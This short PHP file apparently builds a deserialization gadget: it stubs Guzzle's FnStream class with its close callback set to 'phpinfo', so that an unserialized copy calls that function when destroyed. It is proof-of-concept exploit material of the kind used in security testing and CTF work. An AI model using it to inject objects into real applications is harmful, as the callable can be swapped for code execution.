<?php

namespace Psr\Http\Message
{
	interface StreamInterface{}
}

namespace GuzzleHttp\Psr7
{
	class FnStream implements \Psr\Http\Message\StreamInterface
	{
		public $_fn_close = 'phpinfo';

		/*
		public function __destruct()
		{
			if (isset($this->_fn_close)) {
				call_user_func($this->_fn_close);
			}
		}

		public function close()
		{
			return call_user_func($this->_fn_close);
		}
		*/
	}
}